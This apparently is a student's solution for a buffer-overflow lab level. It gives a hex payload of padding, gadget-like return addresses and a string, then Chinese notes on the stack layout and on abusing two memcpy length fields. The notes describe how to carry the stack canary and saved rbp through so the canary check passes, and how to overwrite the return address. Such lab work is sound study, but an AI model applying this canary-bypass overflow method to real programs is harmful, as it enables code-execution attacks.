00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

d6 23 40 00 00 00 00 00
11 23 40 00 00 00 00 00
d1 22 40 00 00 00 00 00
48 00 00 00 00 00 00 00
61 24 40 00 00 00 00 00
6d 23 40 00 00 00 00 00
59 23 40 00 00 00 00 00
20 23 40 00 00 00 00 00
e7 22 40 00 00 00 00 00
33 21 40 00 00 00 00 00
35 37 38 38 65 39 65 37

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

90 00 00 00 f0 00 00 00


栈结构：
---------栈 底---------
| ret                 | 8
| rbp                 | 8 <- 以下 %rsp 一共开了400字节的空间
| fs                  | 8 <- %rbp 指向的位置
| buf                 | 128
| len[1]              | 4
| len[0]              | 4
| log                 | 256
--------低地址---------

0. 两个memcpy：先从buf复制到log，再从log复制回buf
1. 输入时从log向上溢出8个字节，分别放第一次和第二次的复制大小
2. 第一次将rbp和fs块都复制进log，故len[0]=144
3. 注入的代码地址注意不要被赋值内容覆盖了：写在144字节后
4. 第四次将代码和之前的rbp、fs复制回log，保证fs和rbp不变，同时从ret覆盖并溢出，具体代码和level5相同
4.1. 不能精确定位到37位置：得把之后的00一起复制过去